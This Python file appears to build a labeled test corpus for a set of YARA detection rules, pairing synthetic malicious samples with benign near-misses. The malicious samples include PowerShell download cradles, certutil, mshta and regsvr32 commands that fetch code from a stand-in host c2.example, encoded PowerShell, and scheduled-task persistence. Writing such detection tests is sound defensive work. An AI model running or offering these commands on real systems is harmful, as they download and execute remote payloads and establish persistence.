"""Deterministic labeled corpus for the shipped starter YARA pack."""

from __future__ import annotations

from dataclasses import dataclass, field


@dataclass(frozen=True)
class YaraSample:
    name: str
    data: bytes
    expected_rules: frozenset[str] = field(default_factory=frozenset)


def _pe(*markers: bytes) -> bytes:
    data = bytearray(256)
    data[:2] = b"MZ"
    data[0x3C:0x40] = (0x80).to_bytes(4, "little")
    data[0x80:0x84] = b"PE\x00\x00"
    cursor = 0x90
    for marker in markers:
        data[cursor : cursor + len(marker)] = marker
        cursor += len(marker) + 1
    return bytes(data)


def build_yara_corpus() -> list[YaraSample]:
    """Return synthetic positives and adversarial benign near-misses."""
    executable = "Titan_Executable_In_Decoded_Content"
    upx = "Titan_UPX_Packed_Executable"
    return [
        YaraSample(
            "powershell_downloadstring",
            b"IEX (New-Object Net.WebClient).DownloadString('https://c2.example/a')",
            frozenset({"Titan_PowerShell_Download_Cradle"}),
        ),
        YaraSample(
            "powershell_iwr",
            b"Invoke-Expression (Invoke-WebRequest https://c2.example/b).Content",
            frozenset({"Titan_PowerShell_Download_Cradle"}),
        ),
        YaraSample(
            "encoded_powershell",
            b"powershell.exe -NoProfile -EncodedCommand SQBFAFgA",
            frozenset({"Titan_Encoded_Command_Invocation"}),
        ),
        YaraSample(
            "hidden_pwsh",
            b"pwsh -WindowStyle Hidden -File stage.ps1",
            frozenset({"Titan_Encoded_Command_Invocation"}),
        ),
        YaraSample("pe32", _pe(), frozenset({executable})),
        YaraSample("pe64", _pe(b"native payload"), frozenset({executable})),
        YaraSample("upx_sections", _pe(b"UPX0", b"UPX1"), frozenset({executable, upx})),
        YaraSample(
            "upx_signature", _pe(b"UPX0", b"UPX!"), frozenset({executable, upx})
        ),
        YaraSample(
            "javascript_atob",
            b"eval(atob('YWxlcnQoMSk='))",
            frozenset({"Titan_JavaScript_Eval_Decode_Chain"}),
        ),
        YaraSample(
            "javascript_uri_decode",
            b"eval(decodeURIComponent('%61%6c%65%72%74'))",
            frozenset({"Titan_JavaScript_Eval_Decode_Chain"}),
        ),
        YaraSample(
            "certutil_download",
            b"certutil.exe -urlcache -split -f https://c2.example/a.bin a.bin",
            frozenset({"Titan_Certutil_Remote_Download"}),
        ),
        YaraSample(
            "certutil_http",
            b"certutil -urlcache -f http://c2.example/b.bin b.bin",
            frozenset({"Titan_Certutil_Remote_Download"}),
        ),
        YaraSample(
            "mshta_remote",
            b"mshta.exe https://c2.example/launch.hta",
            frozenset({"Titan_MSHTA_Remote_Execution"}),
        ),
        YaraSample(
            "mshta_inline",
            b"mshta javascript:close(new ActiveXObject('WScript.Shell'))",
            frozenset({"Titan_MSHTA_Remote_Execution"}),
        ),
        YaraSample(
            "regsvr32_https",
            b"regsvr32 /s /n /u /i:https://c2.example/a.sct scrobj.dll",
            frozenset({"Titan_Regsvr32_Remote_Scriptlet"}),
        ),
        YaraSample(
            "regsvr32_http",
            b"regsvr32.exe /i:http://c2.example/b.sct scrobj.dll",
            frozenset({"Titan_Regsvr32_Remote_Scriptlet"}),
        ),
        YaraSample(
            "schtasks_encoded_powershell",
            (
                b"schtasks.exe /create /tn CacheUpdate /sc onlogon "
                b'/tr "powershell.exe -EncodedCommand SQBFAFgA" /f'
            ),
            frozenset(
                {
                    "Titan_Encoded_Command_Invocation",
                    "Titan_Scheduled_Task_Suspicious_Execution",
                }
            ),
        ),
        YaraSample(
            "register_scheduled_task_hidden_powershell",
            (
                b"$a=New-ScheduledTaskAction -Execute 'powershell.exe' "
                b"-Argument '-WindowStyle Hidden'; "
                b"$t=New-ScheduledTaskTrigger -AtStartup; "
                b"Register-ScheduledTask -TaskName 'Updater' "
                b"-Action $a -Trigger $t"
            ),
            frozenset(
                {
                    "Titan_Encoded_Command_Invocation",
                    "Titan_Scheduled_Task_Suspicious_Execution",
                }
            ),
        ),
        YaraSample("benign_readme", b"This project contains ordinary documentation."),
        YaraSample("benign_powershell", b"Open PowerShell and run Get-Help."),
        YaraSample("benign_webclient", b"The Net.WebClient API is deprecated."),
        YaraSample("benign_pe_text", b"MZ and PE are executable file signatures."),
        YaraSample("benign_upx_text", b"UPX0 and UPX1 are section-name examples."),
        YaraSample(
            "benign_javascript", b"const decoded = atob(value); console.log(decoded);"
        ),
        YaraSample("benign_certutil", b"certutil -hashfile release.zip SHA256"),
        YaraSample("benign_mshta_local", b"mshta.exe local-help.hta"),
        YaraSample(
            "benign_mshta_docs", b"mshta can access https://docs.example/ in examples"
        ),
        YaraSample("benign_regsvr32", b"regsvr32 /s local-component.dll"),
        YaraSample("benign_scrobj", b"Windows includes the scrobj.dll component."),
        YaraSample("benign_schtasks_query", b"schtasks.exe /query /fo list"),
        YaraSample(
            "benign_scheduled_backup",
            (
                b"schtasks.exe /create /tn DailyBackup /sc onlogon "
                b'/tr "C:\\Program Files\\Backup\\backup.exe" /f'
            ),
        ),
        YaraSample(
            "benign_scheduled_maintenance",
            (
                b"$a=New-ScheduledTaskAction -Execute 'powershell.exe' "
                b"-Argument '-NoProfile -File C:\\Admin\\Rotate-Logs.ps1'; "
                b"$t=New-ScheduledTaskTrigger -AtStartup; "
                b"Register-ScheduledTask -TaskName 'LogRotation' "
                b"-Action $a -Trigger $t"
            ),
        ),
    ]
